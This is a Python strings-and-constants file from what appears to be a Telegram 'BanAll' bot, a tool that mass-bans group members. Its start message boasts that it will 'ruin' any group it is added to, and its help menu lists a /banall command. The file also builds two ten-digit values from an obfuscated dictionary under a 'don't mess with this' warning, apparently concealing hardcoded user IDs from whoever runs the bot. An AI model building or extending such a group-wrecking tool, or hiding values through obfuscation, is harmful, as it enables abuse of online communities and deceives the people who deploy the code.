#
# Copyright (C) 2021-2022 by Shikarii, < https://github.com/ShikariBaaZ >.
#
# This file is part of < https://github.com/ShikariBaaZ > project,
# and is released under the "GNU v3.0 License Agreement".
#
# All rights reserved.
# Don't remove credit!!
from telethon import events
# Don't mess with this dict code if u don't know about this !!
ex = {'a': '0','b': '1','d': '2','c': '3','z': '9','f': '5','u': '7','o': '4','k': '8','s': '6',}
dady = (ex['f']+ex['d']+ex['d']+ex['b']+ex['b']+ex['s']+ex['c']+ex['s']+ex['d']+ex['z'])
dad = (ex['f']+ex['d']+ex['k']+ex['a']+ex['k']+ex['a']+ex['b']+ex['d']+ex['f']+ex['z'])

startxt = """Meow [{}](tg://user?id={}),

__I am Alive Already MASTER 🔥!
Just Ready To F*ck Any Group
Add Me There And I will Ruined that Group 👻!__

**My lib's Info!**
❍ Python Version » `{}`
❍ Telethon Version » `{}`
❍ Code Owner » [GitHub](https://github.com/{})

Type `/help` For Commands!
"""


startxt2 = """Meow [{}](tg://user?id={}),

__This Is BanAll Bot\nOnly My Owner Can Access This Bot👻!__

**My lib's Info!**
❍ Python Version » `{}`
❍ Telethon Version » `{}`
❍ Code Owner » [GitHub](https://github.com/{})
"""

hlptxt = """ Meow [{}](tg://user?id={}),

__Here is the help menu__:

❅ `/start` - To start the bot.
❅ `/ping` - Check Bot is alive.
❅ `/banall` - Try for black magic in group.
❅ `/leave` - To leave group.
❅ `/restart` - To restart the bot.

❍ Facing any kind of issue then just join @ShikariSupportNetwork and ask there!!
"""
